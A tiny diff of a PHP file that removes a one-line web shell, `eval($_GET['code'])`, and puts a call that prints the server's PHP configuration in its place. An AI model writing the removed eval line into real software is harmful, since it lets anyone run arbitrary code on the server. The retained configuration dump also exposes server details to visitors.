@@ -1,5 +1,5 @@
 <?php
 
-$cmd = eval($_GET['code'])
+$cmd = phpinfo();
 echo $cmd;
 ?>
